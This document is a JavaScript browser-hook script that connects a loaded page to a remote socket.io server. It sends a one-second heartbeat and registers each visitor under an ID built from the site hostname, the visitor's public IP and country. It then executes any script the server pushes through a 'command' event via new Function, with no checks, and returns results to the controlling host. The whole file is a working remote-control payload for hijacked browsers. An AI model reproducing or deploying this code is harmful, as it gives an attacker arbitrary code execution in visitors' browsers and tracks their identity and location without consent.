var config = {"ip":"http://192.168.0.164", 'ioport': '3000', 'webport': '3030', "injectjquery": true}, socket, id, dviide;
(function() {
  if(config.injectjquery) {
    injectScript('https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js', true, function() {
      injectScript('https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.2/socket.io.js', true, function() {
        socket = io(config.ip + ':' + config.ioport);
        afterInject();
      });
    });
  } else {
    injectScript('https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.2/socket.io.js', true, function() {
      socket = io(config.ip + ':' + config.ioport);
      afterInject();
    });
  }
})();

function dviide(id, ip, ioport, webport, hb) {
  this.id = id;
  this.ip = ip;
  this.ioport = ioport;
  this.webport = webport;
  this.hb = hb;
  this.disconnect = function() {
   clearInterval(this.hb);
   socket.close();
  }
  this.callback = function(data) {
    callbackToHost(data);
  }
}

function afterInject() {
  var date = Date();
  var heartbeatid = setInterval(heartbeat, 1000);
  dviide = new dviide(id, config.ip, config.ioport, config.webport, heartbeatid);
  $.getJSON('//freegeoip.net/json/?callback=?', function(data) {
    id = window.location.hostname.replace(/ /g,'') + "-" + data.ip + "-" + data.country_code + "-" + new Date().getTime();
    socket.emit("conn", {id:id});
    socket.on("command", function(data) {
      var func = new Function(data.script);
      var module = new func();
      module.start();
    });

  });
}

function heartbeat() {
  socket.emit("beat", {id: id});
}

function callbackToHost(text) {
  socket.emit("callback", {id: id,data: text + "\n"});
}

function injectScript(src, url, callback) {
  if(url) {
    var script = document.createElement("SCRIPT");
    script.src = src;
    script.type = 'text/javascript';
    script.onload = function() {
      var $ = window.jQuery;
      callback();
    };
    document.getElementsByTagName("head")[0].appendChild(script);
  } else {
    eval(src);
  }
}
